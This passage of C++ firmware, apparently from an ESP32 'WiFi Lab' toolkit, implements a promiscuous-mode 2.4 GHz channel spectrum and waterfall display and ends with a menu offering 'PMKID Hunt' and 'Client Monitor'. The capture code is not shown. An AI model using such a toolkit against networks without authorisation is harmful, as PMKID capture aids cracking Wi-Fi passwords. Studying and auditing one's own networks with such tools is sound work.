                                  display::kWarning);
        }
        if (i + 1 == currentChannel) {
            display::g().drawRect(x - 1, kBarTop - 1, 15, kBarHeight + 2,
                                  display::kAccent);
        }
        display::text(x + 5, 75, std::to_string(i + 1), display::kTextDim, 0);
    }

    constexpr int kWfTop = 84;
    constexpr int kRowH = 2;
    if (g_wfCount > 0) {
        const int start =
            (g_wfHead - g_wfCount + kWaterfallRows) % kWaterfallRows;
        for (int row = 0; row < g_wfCount; ++row) {
            const int index = (start + row) % kWaterfallRows;
            const int y = kWfTop + (kWaterfallRows - g_wfCount + row) * kRowH;
            for (int c = 0; c < kChannels; ++c) {
                display::g().fillRect(6 + c * 17, y, 13, kRowH,
                                      levelColor(g_waterfall[index][c]));
            }
        }
    }
    display::footer("ESC=esci  picco=linea gialla");
    display::push();
}

void runSpectrum() {
    if (!startRx(RxSpectrum)) {
        ui::message("Spettro 2.4",
                    {"Modalita' promiscua non disponibile."}, "WiFi Lab");
        return;
    }
    RxGuard guard(true);

    std::memset(g_waterfall, 0, sizeof(g_waterfall));
    g_wfHead = 0;
    g_wfCount = 0;
    for (int i = 0; i < kChannels; ++i) {
        g_specPeaks[i] = 0;
    }

    uint32_t counts[kChannels] = {};
    uint32_t pps = 0;
    uint32_t total = 0;
    uint32_t lastTotal = 0;
    uint32_t lastSnapshot = millis();
    uint8_t channel = 1;
    uint32_t lastDraw = 0;
    bool canceled = false;

    navigation::waitRelease();
    while (!canceled) {
        esp_wifi_set_channel(channel, WIFI_SECOND_CHAN_NONE);
        const uint32_t until = millis() + 60;
        while (static_cast<int32_t>(millis() - until) < 0) {
            navigation::update();
            if (navigation::poll().type == navigation::Event::Back) {
                canceled = true;
                break;
            }
            delay(4);
        }
        if (canceled) {
            break;
        }

        // Barre live: copia non distruttiva dei contatori del canale in corso.
        const uint32_t now = millis();
        if (now - lastDraw > 200) {
            uint32_t live[kChannels] = {};
            for (int i = 0; i < kChannels; ++i) {
                live[i] = g_specCounts[i];
            }
            drawSpectrum(live, pps, total, channel);
            lastDraw = now;
        }

        channel = static_cast<uint8_t>(channel % kChannels + 1);
        if (channel != 1) {
            continue;
        }

        for (int i = 0; i < kChannels; ++i) {
            counts[i] = g_specCounts[i];
            g_specCounts[i] = 0;
        }
        const uint32_t totalNow = g_specTotal;
        const uint32_t elapsed = now - lastSnapshot;
        pps = elapsed > 0 ? (totalNow - lastTotal) * 1000 / elapsed : 0;
        total = totalNow;
        lastTotal = totalNow;
        lastSnapshot = now;

        uint32_t maxCount = 1;
        for (int i = 0; i < kChannels; ++i) {
            maxCount = std::max(maxCount, counts[i]);
            // Peak hold con decay: un burst iniziale non comprime le barre
            // per sempre.
            g_specPeaks[i] = std::max(counts[i], g_specPeaks[i] * 7 / 8);
        }
        for (int i = 0; i < kChannels; ++i) {
            uint32_t level = counts[i] * 4 / maxCount;
            if (counts[i] > 0 && level == 0) {
                level = 1;
            }
            if (level > 4) {
                level = 4;
            }
            g_waterfall[g_wfHead][i] = static_cast<uint8_t>(level);
        }
        g_wfHead = (g_wfHead + 1) % kWaterfallRows;
        if (g_wfCount < kWaterfallRows) {
            ++g_wfCount;
        }
    }

    guard.stop();
}

}  // namespace

void runMenu() {
    MenuManager menu("WiFi Lab", "Menu principale");
    menu.addItem("PMKID Hunt", "wifi", [] { runPmkidHunt(); });
    menu.addItem("Client Monitor", "wifi", [] { runClientMonitor(); });
    menu.addItem("Whitelist", "lock", [] { runWhitelist(); });
    menu.addItem("Spettro 2.4 GHz", "radar", [] { runSpectrum(); });
    menu.setHint("ENTER=apri  `=indietro");
    menu.run(true);
}

}  // namespace wifilab

#endif  // ENABLE_MODULE_WIFILAB
